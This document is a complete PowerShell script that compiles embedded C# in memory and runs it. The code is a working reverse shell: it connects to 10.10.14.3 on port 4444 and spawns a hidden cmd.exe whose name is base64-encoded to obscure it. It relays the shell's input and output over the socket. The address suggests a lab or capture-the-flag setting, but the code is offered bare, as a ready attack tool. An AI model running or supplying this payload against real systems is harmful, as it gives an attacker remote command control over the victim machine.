$src = @"
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;


namespace ConnectBack
{
	public static class ConnectBack
	{

		public static void Main(string[] args)
		{
			TcpClient client = new TcpClient("10.10.14.3", 4444);
			Stream stream = client.GetStream();
			StreamReader rdr = new StreamReader(stream);
			StreamWriter wtr = new StreamWriter(stream);
			StringBuilder strbld = new StringBuilder();

			ProcessStartInfo pinf = new ProcessStartInfo {
				FileName = Encoding.ASCII.GetString(Convert.FromBase64String("Y21kLmV4ZQ==")),
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardInput = true,
				RedirectStandardOutput = true
			};

			Process proc = new Process();
			proc.StartInfo = pinf;
			proc.OutputDataReceived += new DataReceivedEventHandler((sender, e) => {
				StringBuilder strOutput = new StringBuilder();
				if (!String.IsNullOrEmpty(e.Data)) {
					try {
						strOutput.Append(e.Data);
						wtr.WriteLine(strOutput);
						wtr.Flush();
					}
					catch (Exception err) { }
				}
			});

			proc.Start();
			proc.BeginOutputReadLine();
			while (true) {
				strbld.Append(rdr.ReadLine());
				//strInput.Append("\n");
				proc.StandardInput.WriteLine(strbld);
				strbld.Remove(0, strbld.Length);
			}		
		}	

	}
}
"@

$CompilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
$CompilerParameters.GenerateInMemory = $true
$CompilerParameters.CompilerOptions = "/debug /platform:anycpu"
$CompilerParameters.ReferencedAssemblies.Add("System.dll")


Add-Type -TypeDefinition $src -Language CSharp -CompilerParameters $CompilerParameters 

[ConnectBack.ConnectBack]::Main("pwnd")
